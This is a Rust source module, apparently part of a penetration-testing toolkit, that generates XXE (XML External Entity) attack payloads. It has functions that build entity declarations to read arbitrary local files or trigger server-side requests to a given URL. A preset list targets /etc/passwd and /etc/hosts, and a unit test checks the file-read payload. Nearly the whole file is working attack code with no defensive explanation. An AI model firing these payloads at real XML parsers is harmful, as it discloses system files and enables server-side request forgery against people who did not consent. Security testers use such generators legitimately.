//! XXE (XML External Entity) payloads

/// XXE payload
#[derive(Debug, Clone)]
pub struct XxePayload {
    pub name: String,
    pub payload: String,
    pub purpose: XxePurpose,
}

#[derive(Debug, Clone, PartialEq)]
pub enum XxePurpose {
    FileRead,
    Ssrf,
    Dos,
    Oob,
}

impl XxePayload {
    pub fn new(name: &str, payload: &str, purpose: XxePurpose) -> Self {
        Self {
            name: name.to_string(),
            payload: payload.to_string(),
            purpose,
        }
    }
}

/// Generate XXE file read payload
pub fn file_read(file_path: &str) -> String {
    format!(
        r#"<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{}">
]>
<foo>&xxe;</foo>"#,
        file_path
    )
}

/// Generate XXE SSRF payload
pub fn ssrf(url: &str) -> String {
    format!(
        r#"<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{}">
]>
<foo>&xxe;</foo>"#,
        url
    )
}

/// Basic XXE payloads
pub fn basic_payloads() -> Vec<XxePayload> {
    vec![
        XxePayload::new(
            "File read /etc/passwd",
            &file_read("/etc/passwd"),
            XxePurpose::FileRead,
        ),
        XxePayload::new(
            "File read /etc/hosts",
            &file_read("/etc/hosts"),
            XxePurpose::FileRead,
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_file_read() {
        let payload = file_read("/etc/passwd");
        assert!(payload.contains("ENTITY"));
        assert!(payload.contains("/etc/passwd"));
    }
}
